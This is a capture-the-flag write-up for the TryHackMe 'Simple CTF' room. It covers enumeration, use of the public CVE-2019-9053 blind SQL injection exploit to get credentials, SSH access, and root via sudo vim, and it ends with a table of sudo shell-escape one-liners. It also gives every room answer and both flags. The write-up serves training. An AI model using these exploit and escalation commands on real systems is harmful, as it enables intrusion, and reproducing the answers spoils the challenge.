# TryHackMe — Simple CTF

**Platform:** TryHackMe  
**Category:** Web Exploitation / Privilege Escalation  
**Difficulty:** Easy  
**Tools Used:** nmap, gobuster, searchsploit, Python, SSH, vim  

---

## Overview

![TryHackMe Lo-Fi Completed](/images/writeups/tryhackme/simplectf/simplectf.png)

Simple CTF is a beginner-to-intermediate TryHackMe room that walks through a full attack chain — from initial recon and CVE identification to credential extraction, SSH access, and privilege escalation via a GTFOBins vector. The target runs **CMS Made Simple**, a PHP-based content management system with a known SQL injection vulnerability. The path from anonymous visitor to root is methodical and teaches core pentesting fundamentals without any rabbit holes.

---

## Step 1 — Port Scanning with Nmap

```bash
nmap -sV -T4 10.10.X.X
```

**Results:**

![TryHackMe Lo-Fi Completed](/images/writeups/tryhackme/simplectf/terminal1.png)


```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

**Breakdown:**

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | vsftpd 3.0.3 — worth checking for anonymous login |
| 80 | HTTP | Apache serving a web application |
| 2222 | SSH | Non-standard port — SSH moved off port 22 |

> **Q1 — How many services are running under port 1000?**  
> Ports 21 and 80 are both below 1000. **Answer: 2**

> **Q2 — What is running on the higher port?**  
> Port 2222 is running SSH. **Answer: ssh**

### Why Non-Standard SSH?

Moving SSH to port 2222 is a common (though weak) security-through-obscurity measure to reduce automated brute-force attempts targeting port 22. It doesn't change the attack surface meaningfully — nmap still finds it — but it reduces noise from bots scanning only the default port.

---

## Step 2 — FTP Anonymous Login Check

Before moving to the web app, always check FTP for anonymous access:

```bash
ftp 10.10.X.X 21
# Username: anonymous
# Password: (blank or any email)
```

If anonymous login is allowed, look for readable files — even a README can contain usernames, version info, or credentials. Note anything found here for correlation later.

---

## Step 3 — Web Enumeration

Visiting `http://10.10.X.X/` presents the default Apache landing page — nothing useful in visible content or page source.

### Directory Brute-Force with Gobuster

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

```
/simple    (Status: 200)
```

Navigating to `http://10.10.X.X/simple/` reveals a **CMS Made Simple** installation. The page footer discloses the version: **CMS Made Simple 2.2.8**.

Version disclosure is a critical finding in real engagements. It allows direct CVE lookup without any active exploitation — the attacker skips straight to a working exploit.

---

## Step 4 — CVE Identification

With version 2.2.8 confirmed, search ExploitDB:

```bash
searchsploit "CMS Made Simple 2.2.8"
```

**Finding:**

> **CVE-2019-9053** — CMS Made Simple 2.2.8 is vulnerable to unauthenticated blind time-based SQL injection via the `m1_idlist` parameter in the News module. No authentication required.

> **Q3 — What's the CVE?**  
> **Answer: CVE-2019-9053**

> **Q4 — What kind of vulnerability?**  
> **Answer: SQLi**

### What is Blind Time-Based SQLi?

In a standard SQL injection, the database returns data directly in the HTTP response. In a **blind** injection, no data is visible — instead, you infer information by measuring response time. A payload like:

```sql
IF(1=1, SLEEP(5), 0)
```

...causes a ~5 second delay if the condition is true. By asking binary yes/no questions this way, the entire database can be extracted character by character. It's slow but reliable.

---

## Step 5 — Exploiting CVE-2019-9053

### Getting the Exploit Script

```bash
searchsploit -m 46635
# Downloads 46635.py to current directory
```

### Python 2 → Python 3 Fixes

The original exploit was written for Python 2. Two fixes are needed for Python 3:

**Fix 1 — print statements:**
```python
# Old (Python 2)
print "cracking..."

# Fix (Python 3)
print("cracking...")
```

**Fix 2 — wordlist file handling:**
```python
# Old (Python 2)
dict = open(wordlist)

# Fix (Python 3) — handles encoding errors in large wordlists
dict = open(wordlist, errors='ignore')
```

### Running the Exploit

```bash
python3 46635.py -u http://10.10.X.X/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

The script performs blind time-based SQLi to extract the username, email, and password hash, then cracks the hash against the provided wordlist.

**After ~20 minutes:**

```
[+] Username found: mitch
[+] Email found:    admin@admin.com
[+] Password found: secret
```

> **Q5 — What's the password?**  
> **Answer: secret**

### Why Does It Take So Long?

Time-based blind SQLi extracts data one character at a time via HTTP delay measurements. Extracting a full hash involves thousands of requests. This is expected behaviour — in real engagements you'd run this in the background or use `sqlmap --level=3 --technique=T` with threading.

---

## Step 6 — Gaining Access

### CMS Admin Panel

Gobuster on the `/simple/` path reveals an admin panel:

```bash
gobuster dir -u http://10.10.X.X/simple/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# /simple/admin/
```

Logging in with `mitch:secret` confirms mitch has administrator privileges in the CMS. Useful for further enumeration, but the bigger prize is SSH.

### SSH Login

Try the same credentials over SSH (remember the non-standard port):

```bash
ssh mitch@10.10.X.X -p 2222
# Password: secret
```

Login successful — we're in as `mitch`.

> **Q6 — Where can you login with the obtained details?**  
> **Answer: ssh**

---

## Step 7 — User Flag

```bash
pwd       # /home/mitch
ls        # user.txt
cat user.txt
```

> **Q7 — What's the user flag?**  
> **Answer: G00d j0b, keep up!**

---

## Step 8 — Enumerating Other Users

```bash
ls /home
# mitch  sunbath
```

> **Q8 — Is there any other user in the home directory?**  
> **Answer: sunbath**

In a deeper engagement, check `/home/sunbath/` for readable files, `.bash_history`, SSH keys, or notes containing credentials. Even if you can't read the files directly, their existence shapes your privilege escalation strategy.

---

## Step 9 — Privilege Escalation via Vim

### Sudo Enumeration

The first command after landing a shell should always be:

```bash
sudo -l
```

**Output:**

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`mitch` can run `vim` as root **without a password**. This is a textbook GTFOBins escalation path.

> **Q9 — What can you leverage to spawn a privileged shell?**  
> **Answer: vim**

### Why is This Dangerous?

`vim` has a built-in shell execution feature — the `:!command` syntax runs any shell command from within the editor. Since vim inherits the permissions of the process that launched it, running `sudo vim` and then executing `/bin/bash` from inside it spawns a root shell.

### Exploitation

**Method 1 — Non-interactive (cleaner):**
```bash
sudo vim -c ':!/bin/bash'
```

**Method 2 — Interactive:**
```bash
sudo vim
# Inside vim, type:
:!/bin/bash
# Press Enter
```

Both produce the same result — a root shell:

```bash
whoami
# root
```

---

## Step 10 — Root Flag

```bash
cd /root
ls        # root.txt
cat root.txt
```

> **Q10 — What's the root flag?**  
> **Answer: W3ll d0n3. You made it!**

---

## Full Attack Chain Summary

```
nmap scan
    │
    ▼
Ports 21 (FTP), 80 (HTTP), 2222 (SSH) identified
    │
    ▼
Gobuster → /simple/ → CMS Made Simple 2.2.8
    │
    ▼
searchsploit → CVE-2019-9053 (Blind Time-Based SQLi)
    │
    ▼
Python exploit → mitch:secret
    │
    ▼
SSH login on port 2222 → mitch shell
    │
    ▼
cat ~/user.txt → user flag
    │
    ▼
sudo -l → vim (NOPASSWD as root)
    │
    ▼
sudo vim -c ':!/bin/bash' → root shell
    │
    ▼
cat /root/root.txt → root flag
```

---

## Key Concepts

**Version disclosure** — the CMS footer revealing version 2.2.8 was the pivot point of the entire attack. Without it, finding CVE-2019-9053 would require active fuzzing. Always record software versions during enumeration.

**Blind Time-Based SQLi** — extracts database content without any visible output by exploiting response timing. The Python exploit from ExploitDB automates this entirely, including hash cracking.

**Credential reuse** — `mitch:secret` worked on both the CMS admin panel and SSH. Password reuse across services is extremely common and always worth testing after extracting any credential.

**GTFOBins — vim** — any program that can execute shell commands and is reachable via `sudo` is a potential escalation vector. Always run `sudo -l` immediately after gaining a shell and cross-reference results at [gtfobins.github.io](https://gtfobins.github.io).

**Non-standard ports** — SSH on 2222 is security through obscurity. Nmap's default scan covers the top 1000 most common ports (2222 is in that list), so this provides no real protection against a proper scan.

---

## Common GTFOBins Escalation Paths

For reference — other `sudo` escalation vectors you'll frequently encounter in CTFs:

| Binary | Escalation Command |
|---|---|
| `vim` | `sudo vim -c ':!/bin/bash'` |
| `python3` | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| `find` | `sudo find . -exec /bin/bash \; -quit` |
| `less` | `sudo less /etc/passwd` → `!/bin/bash` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `nano` | `sudo nano` → `Ctrl+R` `Ctrl+X` → `reset; bash 1>&0 2>&0` |
| `nmap` | `sudo nmap --interactive` → `!sh` (older versions only) |

---

## Tools Reference

| Tool | Command | Purpose |
|---|---|---|
| `nmap` | `nmap -sV -T4 <IP>` | Service and version discovery |
| `gobuster` | `gobuster dir -u <URL> -w <wordlist>` | Directory enumeration |
| `searchsploit` | `searchsploit "CMS Made Simple 2.2.8"` | CVE and exploit lookup |
| `python3` | `python3 46635.py -u <URL> --crack -w rockyou.txt` | Blind SQLi exploitation |
| `ssh` | `ssh mitch@<IP> -p 2222` | Remote shell access |
| `sudo -l` | — | Enumerate allowed sudo commands |
| `vim` | `sudo vim -c ':!/bin/bash'` | Privilege escalation via GTFOBins |

---

*Tags: `sql-injection` `blind-sqli` `cve-2019-9053` `cms-made-simple` `privilege-escalation` `gtfobins` `vim` `gobuster` `tryhackme` `ctf`*